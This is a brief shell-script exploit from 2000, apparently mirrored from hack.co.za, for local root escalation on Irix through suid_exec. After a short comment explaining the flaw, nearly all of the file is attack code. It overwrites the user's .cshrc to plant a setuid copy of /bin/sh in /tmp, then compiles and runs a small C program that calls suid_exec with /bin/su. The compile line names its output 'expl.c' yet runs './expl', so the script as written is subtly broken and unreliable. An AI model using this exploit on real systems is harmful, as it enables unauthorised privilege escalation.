#!/bin/sh
#
# /*    This file passed through H.O.D - www.hack.co.za     */
#
#
# By default  all suid  executable files  on Irix  are ELF binaries,
# and when shell tries to parse  such a file all you get  is errors,
# but. Suid_exec  gets shell  name from  SHELL environment variable.
# Besides, it doesn't care what this  shell may do, and it may  do a
# lot of interesting  things, like executing  dot files.   There are
# many ways to exploit it, to my taste the easiest is

setenv | grep SHELL

mv ~/.cshrc ~/.cshrc.old
cat > ~/.cshrc << 0wned
cp /bin/sh /tmp
chmod a+rsx /tmp/sh
0wned
cat > expl.c << 0wned
main()
{
   execl("/sbin/suid_exec","/bin/su","/bin/su",0);
}
0wned

cc expl.c -o expl.c
./expl
/tmp/sh

#                 www.hack.co.za           [2000]#